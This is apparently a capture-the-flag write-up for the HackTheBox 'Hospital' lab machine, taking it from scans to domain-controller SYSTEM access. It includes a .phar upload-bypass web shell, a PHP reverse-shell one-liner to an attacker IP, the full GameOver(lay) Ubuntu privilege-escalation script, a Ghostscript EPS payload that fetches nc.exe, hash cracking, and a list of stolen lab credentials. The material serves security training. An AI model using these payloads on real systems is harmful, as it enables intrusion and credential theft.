# Hospital

<figure><img src="../../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>

## Scanning <a href="#scanning" id="scanning"></a>

### Nmap <a href="#nmap" id="nmap"></a>

```bash
Nmap scan report for hospital.htb (10.10.11.241)
Host is up (0.11s latency).
Not shown: 65506 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-01-07 18:59:50Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
443/tcp   open  ssl/http          Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
1801/tcp  open  msmq?
2103/tcp  open  msrpc             Microsoft Windows RPC
2105/tcp  open  msrpc             Microsoft Windows RPC
2107/tcp  open  msrpc             Microsoft Windows RPC
2179/tcp  open  vmrdp?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3269/tcp  open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Issuer: commonName=DC.hospital.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-05T18:39:34
| Not valid after:  2024-03-06T18:39:34
| MD5:   0c8a:ebc2:3231:590c:2351:ebbf:4e1d:1dbc
|_SHA-1: af10:4fad:1b02:073a:e026:eef4:8917:734b:f8e3:86a7
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-01-07T19:00:45+00:00
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6404/tcp  open  msrpc             Microsoft Windows RPC
6406/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp  open  msrpc             Microsoft Windows RPC
6409/tcp  open  msrpc             Microsoft Windows RPC
6615/tcp  open  msrpc             Microsoft Windows RPC
6639/tcp  open  msrpc             Microsoft Windows RPC
8080/tcp  open  http              Apache httpd 2.4.55 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.55 (Ubuntu)
| http-title: Login
|_Requested resource was login.php
9389/tcp  open  mc-nmf            .NET Message Framing
25434/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Uptime guess: 17.239 days (since Thu Dec 21 01:17:30 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Hosts: DC, www.example.com; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-07T19:00:48
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   134.83 ms 10.10.16.1
2   134.95 ms hospital.htb (10.10.11.241)

NSE: Script Post-scanning.
Initiating NSE at 07:01
Completed NSE at 07:01, 0.00s elapsed
Initiating NSE at 07:01
Completed NSE at 07:01, 0.00s elapsed
Initiating NSE at 07:01
Completed NSE at 07:01, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.32 seconds
           Raw packets sent: 131184 (5.776MB) | Rcvd: 897 (191.359KB)
```

### HTTP <a href="#http" id="http"></a>

{% embed url="http://hospital.htb:8080/login.php" %}

<figure><img src="../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

Register a user:

<figure><img src="../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

Try to upload something, seem to work:

<figure><img src="../../.gitbook/assets/image.avif" alt=""><figcaption></figcaption></figure>

Fuzz directories:

<figure><img src="../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

### HTTPS

<figure><img src="../../.gitbook/assets/image (1).avif" alt=""><figcaption></figcaption></figure>

**Fuzz directories:**

Nothing relevant...

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://hospital.htb/FUZZ -recursion -recursion-depth 2 -fc 403 -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://hospital.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 5322, Words: 366, Lines: 97, Duration: 114ms]
installer               [Status: 301, Size: 343, Words: 22, Lines: 10, Duration: 50ms]
[INFO] Adding a new job to the queue: https://hospital.htb/installer/FUZZ

                        [Status: 200, Size: 5322, Words: 366, Lines: 97, Duration: 216ms]
Installer               [Status: 301, Size: 343, Words: 22, Lines: 10, Duration: 74ms]
[INFO] Adding a new job to the queue: https://hospital.htb/Installer/FUZZ
```

### SMB

Detect SMB version with Metasploit:

```bash
[*] 10.10.11.241:445      - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-GCM) (signatures:required) (guid:{1d66f576-02af-4bc8-bad7-3e98ffc19929}) (authentication domain:HOSPITAL)
[*] hospital.htb:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Try lo list shares:

```bash
# smbclient -L \\\\hospital.htb\\                   
Password for [WORKGROUP\root]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

### DNS <a href="#dns" id="dns"></a>

Simple DNS Plus

```bash
nslookup -query=any 'hospital.htb' -server '10.10.11.241'  
*** Invalid option: server
Server:         10.10.11.241
Address:        10.10.11.241#53

Name:   hospital.htb
Address: 10.10.11.241
Name:   hospital.htb
Address: 192.168.5.1
hospital.htb    nameserver = dc.hospital.htb.
hospital.htb
        origin = dc.hospital.htb
        mail addr = hostmaster.hospital.htb
        serial = 472
        refresh = 900
        retry = 600
        expire = 86400
        minimum = 3600
Name:   hospital.htb
Address: dead:beef::8a13:3848:1b43:e9a
Name:   hospital.htb
Address: dead:beef::213
```

#### Info obtained <a href="#info-obtained" id="info-obtained"></a>

* **LDAP**: domain controller and domain is DC.hospital.htb
* **HTTP**:
  * test user exist
  * password at least 6 character
  * Apache 2.4.55
  * Registration open
* **HTTPS**:
  * Hospital Webmail roundcube
  * PHP 8.0.28
  * Apache 2.4.56
* **SMB**:
  * No anonymous access
  * Signature required
  * Versions 2, 3
  * Authentication domain: HOSPITAL
* **DNS**:
  * origin: **dc.hospital.htb**

## Gaining Access

### File Upload Vulnerability <a href="#file-upload-vulnerability" id="file-upload-vulnerability"></a>

Try to search a File Upload Vulnerability. With a registered account we can try to upload a fake image containing a PHP reverse shell. From preceding fuzzing, we know that there is a directory called **uploads** but images when retrieved are not processed by web server but **only stored** so we need to force the PHP upload trying different extensions.

We see that `.phar` extension is allowed so we try to upload a web shell (reverse shell not work due to inability to demonize the process) and trigger it using this path: [http://hospital.htb:8080/uploads/powny.phar](http://hospital.htb:8080/uploads/powny.phar)

<figure><img src="../../.gitbook/assets/image (2).avif" alt=""><figcaption></figcaption></figure>

### Get a reverse Shell <a href="#reverse-shell" id="reverse-shell"></a>

Use the php oneline reverse shell:

```bash
php -r '$sock=fsockopen("10.10.15.101",6666);shell_exec("sh <&3 >&3 2>&3");'
```

<figure><img src="../../.gitbook/assets/image (3).avif" alt=""><figcaption></figcaption></figure>

1. Obtain a reverse shell
2. Spawn a tty `python3 -c 'import pty; pty.spawn("/bin/bash")'`

<figure><img src="../../.gitbook/assets/image (4).avif" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

Under `/var/www/html` there are some interesting files:

{% code title="config.php" %}
```php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```
{% endcode %}

{% code title="register.php" %}
```php
<?php
// Include config file
require_once "config.php";
 
// Define variables and initialize with empty values
$username = $password = $confirm_password = "";
$username_err = $password_err = $confirm_password_err = "";
 
// Processing form data when form is submitted
if($_SERVER["REQUEST_METHOD"] == "POST"){
 
    // Validate username
    if(empty(trim($_POST["username"]))){
        $username_err = "Please enter a username.";
    } elseif(!preg_match('/^[a-zA-Z0-9_]+$/', trim($_POST["username"]))){
        $username_err = "Username can only contain letters, numbers, and underscores.";
    } else{
        // Prepare a select statement
        $sql = "SELECT id FROM users WHERE username = ?";
        
        if($stmt = mysqli_prepare($link, $sql)){
            // Bind variables to the prepared statement as parameters
            mysqli_stmt_bind_param($stmt, "s", $param_username);
            
            // Set parameters
            $param_username = trim($_POST["username"]);
            
            // Attempt to execute the prepared statement
            if(mysqli_stmt_execute($stmt)){
                /* store result */
                mysqli_stmt_store_result($stmt);
                
                if(mysqli_stmt_num_rows($stmt) == 1){
                    $username_err = "This username is already taken.";
                } else{
                    $username = trim($_POST["username"]);
                }
            } else{
                echo "Oops! Something went wrong. Please try again later.";
            }

            // Close statement
            mysqli_stmt_close($stmt);
        }
    }
    
    // Validate password
    if(empty(trim($_POST["password"]))){
        $password_err = "Please enter a password.";     
    } elseif(strlen(trim($_POST["password"])) < 6){
        $password_err = "Password must have atleast 6 characters.";
    } else{
        $password = trim($_POST["password"]);
    }
    
    // Validate confirm password
    if(empty(trim($_POST["confirm_password"]))){
        $confirm_password_err = "Please confirm password.";     
    } else{
        $confirm_password = trim($_POST["confirm_password"]);
        if(empty($password_err) && ($password != $confirm_password)){
            $confirm_password_err = "Password did not match.";
        }
    }
    
    // Check input errors before inserting in database
    if(empty($username_err) && empty($password_err) && empty($confirm_password_err)){
        
        // Prepare an insert statement
        $sql = "INSERT INTO users (username, password) VALUES (?, ?)";
         
        if($stmt = mysqli_prepare($link, $sql)){
            // Bind variables to the prepared statement as parameters
            mysqli_stmt_bind_param($stmt, "ss", $param_username, $param_password);
            
            // Set parameters
            $param_username = $username;
            $param_password = password_hash($password, PASSWORD_DEFAULT); // Creates a password hash
            
            // Attempt to execute the prepared statement
            if(mysqli_stmt_execute($stmt)){
                // Redirect to login page
                header("location: login.php");
            } else{
                echo "Oops! Something went wrong. Please try again later.";
            }

            // Close statement
            mysqli_stmt_close($stmt);
        }
    }
    
    // Close connection
    mysqli_close($link);
}
?>
 
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Sign Up</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="images/icons/favicon.ico">
    <link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="vendor/an
	....re
```
{% endcode %}



🗒&#xFE0F;_&#x46;rom here we can see that `.phar` extension is not included in $blockedExtensions_

{% code title="uploads.php" %}
```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (isset($_FILES['image'])) {
        $blockedExtensions = ['php', 'php1', 'php2', 'php3', 'php4', 'php5', 'php6', 'php7', 'php8', 'phtml', 'html', 'aspx', 'asp'];
        $uploadDirectory = 'uploads/';
        $uploadedFile = $uploadDirectory . basename($_FILES['image']['name']);
        $fileExtension = strtolower(pathinfo($uploadedFile, PATHINFO_EXTENSION));

        if (!in_array($fileExtension, $blockedExtensions)) {
            if (move_uploaded_file($_FILES['image']['tmp_name'], $uploadedFile)) {
                header("Location: /success.php");
                exit;
            } else {
                header("Location: /failed.php");
                exit;
            }
        } else {
            header("Location: /failed.php");
            exit;
        }
    }
}
```
{% endcode %}

{% code title=".htaccess" %}
```bash
AddType application/x-httpd-php .phar
```
{% endcode %}

<details>

<summary>More info on .htaccess and his configuration</summary>

The .htaccess file is a configuration file primarily used on Apache web servers. It provides a way to set specific directives for specific directories without modifying the main server configuration file.

The "AddType" directive in the specific context, "AddType application/x-httpd-php .phar," is an instruction for the Apache server. This line tells the server to treat files with the ".phar" extension as PHP files. In other words, when the server receives a request for a file with the ".phar" extension, it will interpret it as a PHP file and process it through the PHP engine rather than treating it as a static file.

.phar files are PHP archives containing applications or libraries and can be executed as PHP scripts. The instruction in the .htaccess file allows the server to recognize .phar files as files that should be interpreted and processed through the PHP engine, enabling them to run PHP code when accessed through the Apache web server.

</details>

We can try to list current OS users:&#x20;

<figure><img src="../../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

Try to connect to mysql database:

```bash
mysql -u root -p -h localhost
```

And from mysql console we can dump passwords and users info:

<figure><img src="../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

```sql
use hospital;
show tables;
select * from users;
```

MySQL password dump:

```
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
|  3 | teste    | $2y$10$90viCFR7SaUQdFUeKIQbOu6AXEbR//N1XvQHjXskMcVXiAqtcqlFW | 2024-01-10 04:17:44 |
|  4 | lilpil   | $2y$10$ePnfu.p/U/73/XxXFmImj.5YrbNlzyirfYNHgDai9Tft1T5dhr6VO | 2024-01-10 06:54:06 |
+----+----------+--------------------------------------------------------------+---------------------+
```

<figure><img src="../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

### Crack MySQL passwords

1. For each hash create a hashtmp file to use in hashcat.
2.  Identify the type of hash using `hashid hashtmp`\


    <figure><img src="../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>
3. Find the mode code to use: `hashcat -h | grep Blowfish`
4. Crack for each hash: `hashcat -m 300 -a 0 tmphash`

> -m 3200: Mode 3200 | bcrypt Blowflish (Unix) -a 0 : dictionary mode (0)

### Exploit OS vulnerability

```bash
www-data@webserver:/etc/apache2$ cat /etc/os-release`
cat /etc/os-release
PRETTY_NAME="Ubuntu 23.04"
NAME="Ubuntu"
VERSION_ID="23.04"
VERSION="23.04 (Lunar Lobster)"
VERSION_CODENAME=lunar
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=lunar
LOGO=ubuntu-logo
```

CVE-2023-2640-CVE-2023-32629 https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629

Upload the exploit shell file using the webshell and sweet UPLOAD feature:

<figure><img src="../../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

I need to modify the name of /var/tmp/bash file created by exploit due to other users that are running on the same machine and using the same exploit:

```bash
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/mybash && chmod 4755 /var/tmp/mybash && /var/tmp/mybash -p && rm -rf l m u w /var/tmp/mybash")'

```

And we gain root access to this machine:

<figure><img src="../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

Now that we're root, show the `/etc/shadow` content:

<figure><img src="../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

```
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```

Try to crack the drwilliams hash password:

<figure><img src="../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

Connecting using SSH work:

<figure><img src="../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

Also work the login on RoundCube mail portal:

<figure><img src="../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

Mail received from DrBrown:

<figure><img src="../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

Upon exploring the webmail service, it appears to be a platform for sending emails. Upon receiving a mail in the form of an .eps file, it’s worth noting that such files often leverage Ghostscript for execution. This could lead to the identification of a potential exploit.

{% embed url="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection" %}

<figure><img src="../../.gitbook/assets/image (285).png" alt=""><figcaption></figcaption></figure>

Having previously identified Active Directory services, it is likely that the victim's computer is a windows machine, so we try to trigger a reverse shell in the Windows environment by going to inject a payload inside the .eps file.

1.  Download first `nc.exe` from attacker machine at the path `/usr/share/windows-resources/binaries`\


    <figure><img src="../../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>
2.  Then execute a reverse shell to connect to attacker machine:\


    <figure><img src="../../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>

On Desktop we will find the user flag:

<figure><img src="../../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>

Inside Documents folder there is a ghostscript.bat file:\
`type ghostscript.bat`

<figure><img src="../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

### Active Directory Post-Compromise

Run an ldapdomaindump using stolen credentials:&#x20;

```bash
sudo /usr/bin/ldapdomaindump ldaps://dc.hospital.htb -u 'hospital\drbrown' -p 'chr!$br0wn'
```

<figure><img src="../../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>

Use crackmapexec to pass-the-password of chris brown:

```bash
./crackmapexec smb dc.hospital.htb -u drbrown -d hospital.htb -p 'chr!$br0wn' 
SMB         10.10.11.241    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.241    445    DC               [+] hospital.htb\drbrown:chr!$br0wn
```

### Exploit RPC

<figure><img src="../../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>

Once connected, utilize the command “querydispinfo” to examine the data. You’ll notice that Administrator Information is shared with the Guest.

<figure><img src="../../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>

We attempt to upload a webshell onto the web service to investigate the permissions it operates with in xampp\htdocs:

<figure><img src="../../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

And we will become NT AUTHORITY/SYSTEM !

## Info stealed

* MySQL:
  * `root` : `my$qls3rv1c3!`
  * dbname : `hospital`
  * table called `users` for all users
  * `drwilliams` : `qwe123!@#`
  * admin : 123456
* Ubuntu 23.04 (Lunar Lobster)
* Active Directory:
  * `hospital\drbrown` : `chr!$br0wn`
  * DC$ DC.hospital.htb Windows Server 2019 Standard
  * Chris Brown member of Remote Management Users, Performance Log Users, Remote Desktop Users, Users

